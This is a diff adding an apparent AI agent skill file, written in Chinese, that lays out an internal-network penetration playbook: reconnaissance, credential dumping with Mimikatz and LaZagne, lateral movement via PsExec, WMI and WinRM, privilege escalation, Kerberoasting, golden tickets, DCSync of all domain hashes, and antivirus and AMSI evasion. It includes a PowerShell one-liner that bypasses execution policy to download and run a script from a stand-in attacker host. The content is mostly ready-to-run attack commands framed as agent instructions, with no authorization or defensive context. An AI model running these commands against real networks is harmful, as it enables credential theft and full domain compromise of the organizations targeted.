@@ -1,0 +1,150 @@
+---
+name: 内网渗透攻击
+description: Use when encountering 内网渗透全流程 - 信息收集、凭据窃取、横向移动、权限提升、域渗透
+---
+
+# 内网渗透攻击
+
+## Info
+
+- **Domain**: intranet
+- **Tags**: intranet, active-directory, lateral-movement, privilege-escalation, credential-theft
+
+## 攻击思路
+```
+端点突破 → 内网信息收集 → 凭据窃取 → 横向移动 → 权限提升 → 域控控制
+```
+
+## 信息收集矩阵
+
+| 任务 | 工具 | 目标 |
+|------|------|------|
+| 存活主机 | nmap -sn, fping | 网段拓扑 |
+| 端口识别 | nmap -sV | 445/3389/8080等关键端口 |
+| 域环境识别 | nltest, dsquery | DC定位/域用户枚举 |
+| 权限识别 | whoami /all | 当前用户组权限 |
+| 网络连接 | netstat -ano | 活动连接/监听端口 |
+
+```bash
+# Windows信息收集
+whoami /all
+net user /domain
+net group "domain admins" /domain
+nltest /domain_trusts
+
+# Linux信息收集
+id; groups
+cat /etc/passwd
+ps aux
+```
+
+## 凭据窃取矩阵
+
+| 来源 | 工具 | 获取凭据类型 |
+|------|------|--------------|
+| 内存 | Mimikatz | 明文密码/Kerberos票据 |
+| SAM | reg save/impacket | 本地用户Hash |
+| LSASS | procdump+Mimikatz | 内存凭据 |
+| 浏览器 | LaZagne, BrowserPwd | Chrome/Firefox密码 |
+| 配置文件 | 手工搜索 | Web.config/连接字符串 |
+| 注册表 | reg query | 保存的凭据 |
+| 组策略 | gpmc.msc | GPO中的密码 |
+
+```bash
+# Mimikatz
+mimikatz.exe "sekurlsa::logonpasswords" exit
+mimikatz.exe "lsadump::lsa /patch" exit
+mimikatz.exe "sekurlsa::tickets" exit
+
+# LaZagne
+lazagne.exe all
+```
+
+## 横向移动矩阵
+
+| 协议/方式 | 工具 | 特点 |
+|-----------|------|------|
+| SMB/PsExec | impacket-psexec | 需要管理员权限 |
+| WMI | wmic, impacket-wmiexec | 无文件落地 |
+| WinRM | evil-winrm | PowerShell远程 |
+| RDP | xfreerdp | 图形界面 |
+| SSH | sshpass/expect | Linux横向 |
+| 计划任务 | schtasks | 定时执行 |
+| 服务创建 | sc create | 远程服务 |
+
+```bash
+# PsExec横向
+impacket-psexec domain/user:password@target -c command.exe
+
+# WMI横向
+wmic /node:target /user:admin /password:pass process call create "cmd.exe"
+
+# WinRM横向
+evil-winrm -i target -u user -p password
+```
+
+## 权限提升矩阵
+
+| Windows提权 | Linux提权 |
+|-------------|-----------|
+| 内核漏洞(CVE) | 内核漏洞 |
+| 服务路径漏洞 | SUID程序 |
+| Token窃取 | sudo配置错误 |
+| UAC绕过 | Cron任务 |
+| DLL劫持 | Capabilities |
+| AlwaysNotify绕过 | 内核模块漏洞 |
+
+```bash
+# Windows提权检查
+winpeas.exe
+powershell -ep bypass "IEX(New-Object Net.WebClient).downloadString('http://attacker/PowerUp.ps1')"
+
+# Linux提权检查
+linpeas.sh
+find / -perm -4000 2>/dev/null
+```
+
+## 域渗透攻击链
+
+### 攻击矩阵
+
+| 攻击类型 | 目标 | 工具 |
+|----------|------|------|
+| Kerberoasting | SPN服务账户Hash | Rubeus, hashcat |
+| AS-REP Roasting | 预认证禁用用户 | Rubeus |
+| BloodHound | 攻击路径分析 | BloodHound GUI |
+| DCSync | 域控同步攻击 | Mimikatz |
+| 黄金票据 | KRBTGT Hash伪造 | Mimikatz |
+| 白银票据 | 服务账户伪造 | Mimikatz |
+| ADCS攻击 | 证书服务漏洞 | Certipy |
+
+### Kerberoasting
+```bash
+# 获取SPN账户票据
+Rubeus.exe kerberoast /stats
+setspn -T domain -Q */* | findstr "CN"
+
+# 离线破解
+hashcat -m 13100 krbhash.txt wordlist.txt
+```
+
+### 黄金票据
+```bash
+# 需要KRBTGT Hash
+mimikatz.exe "kerberos::golden /domain:domain.local /sid:S-1-5-21-xxx /krbtgt:ntlmhash /user:Administrator /ptt" exit
+```
+
+### DCSync
+```bash
+mimikatz.exe "lsadump::dcsync /domain:domain.local /user:Administrator" exit
+mimikatz.exe "lsadump::dcsync /domain:domain.local /all" exit
+```
+
+## 免杀与规避
+
+| 技术 | 方法 |
+|------|------|
+| Payload免杀 | 加密/编码/分离 |
+| 进程注入 | 内存注入避免文件 |
+| AMSI绕过 | 内存Patch |
+| 流量隐蔽 | 隧道/代理 |
